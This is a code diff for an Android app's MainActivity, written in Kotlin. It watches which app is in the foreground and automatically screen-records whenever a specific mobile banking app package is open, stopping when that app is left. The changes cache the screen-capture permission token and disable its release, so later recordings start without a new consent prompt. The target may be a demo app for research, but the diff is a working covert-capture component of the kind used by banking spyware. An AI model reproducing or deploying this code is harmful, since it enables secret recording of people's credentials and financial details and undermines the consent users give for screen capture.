@@ -62,13 +62,20 @@ class MainActivity : AppCompatActivity() {
     // Caching projection permission result for potential re-use
     private var savedResultCode: Int? = null
     private var savedResultData: Intent? = null
+    private var isStarting = false
+    private var lastTopApp: String? = null
 
     private val requestProjectionLauncher = registerForActivityResult(
         ActivityResultContracts.StartActivityForResult()
     ) { result ->
         if (result.resultCode == Activity.RESULT_OK && result.data != null) {
+            // Save that shittt
+            savedResultCode = result.resultCode
+            savedResultData = result.data
+            isStarting = false
             startRecordingWithResult(result.resultCode, result.data!!)
         } else {
+            isStarting = false
             toast("Screen capture permission denied")
             setStatus("Idle")
         }
@@ -115,12 +122,24 @@ class MainActivity : AppCompatActivity() {
                 val topApp = getTopApp()
                 Log.d(TAG, "Top app = $topApp")
 
+                // Case 1: Target app comes to foreground
                 if (topApp == "com.ahmadsyuaib.androidmobilebankingapp") {
                     if (!isRecording) {
                         // toast("Target app detected: $topApp. Starting recording...")
                         requestProjection();
                     }
                 }
+
+                // Case 2: Target app was foreground, but now it’s not
+                if (lastTopApp == "com.ahmadsyuaib.androidmobilebankingapp" &&
+                    topApp != "com.ahmadsyuaib.androidmobilebankingapp") {
+                    if (isRecording) {
+                        Log.d(TAG, "Target app went background, stopping recording...")
+                        stopRecording()
+                    }
+                }
+
+                lastTopApp = topApp
                 monitorHandler.postDelayed(this, checkInterval)
             }
         })
@@ -204,9 +223,18 @@ class MainActivity : AppCompatActivity() {
 
     private fun requestProjection() {
 
+        if (isStarting || isRecording) return
+        isStarting = true
+
+        mediaProjection?.let {
+            startRecordingWithExistingProjection()
+            isStarting = false
+            return
+        }
+
         if (savedResultCode != null && savedResultData != null) {
-            // ✅ Reuse the saved token
             startRecordingWithResult(savedResultCode!!, savedResultData!!)
+            isStarting = false
             return
         }
 
@@ -219,6 +247,7 @@ class MainActivity : AppCompatActivity() {
                     arrayOf(Manifest.permission.WRITE_EXTERNAL_STORAGE),
                     STORAGE_PERMISSION_REQUEST
                 )
+                isStarting = false
                 return
             }
         }
@@ -272,6 +301,28 @@ class MainActivity : AppCompatActivity() {
         } catch (e: Exception) {
             Log.e(TAG, "Error starting recording", e)
             toast("Failed to start recording: ${e.message}")
+            cleanupRecording()
+        }
+    }
+
+    private fun startRecordingWithExistingProjection() {
+        try {
+            setStatus("Setting up recording (existing projection)...")
+
+            val outputFile = createOutputFile() ?: run {
+                toast("Failed to create output file")
+                setStatus("File creation failed")
+                return
+            }
+            currentVideoFile = outputFile
+
+            if (!setupMediaRecorder(outputFile)) return
+            createVirtualDisplayAndStart()
+        } catch (e: Exception) {
+            Log.e(TAG, "Error starting with existing projection", e)
+            toast("Failed to start: ${e.message}")
+            isRecording = false
+            isStarting = false
             cleanupRecording()
         }
     }
@@ -485,7 +536,7 @@ class MainActivity : AppCompatActivity() {
             cleanupRecording()
         }
     }
-    
+
     private fun checkRecordedFile() {
         currentVideoFile?.let { file ->
             if (file.exists() && file.length() > 0) {
@@ -510,11 +561,11 @@ class MainActivity : AppCompatActivity() {
             virtualDisplay?.release()
             virtualDisplay = null
         }
-        
-        runCatching {
-            mediaProjection?.stop()
-            mediaProjection = null
-        }
+        // Disabling this to resuse token
+        // runCatching {
+        //     mediaProjection?.stop()
+        //     mediaProjection = null
+        // }
         
         releaseMediaRecorder()
         
@@ -525,7 +576,7 @@ class MainActivity : AppCompatActivity() {
 
     private fun releaseMediaRecorder() {
         mediaRecorder?.apply {
-            runCatching { stop() }
+            // runCatching { stop() }
             runCatching { reset() }
             runCatching { release() }
         }
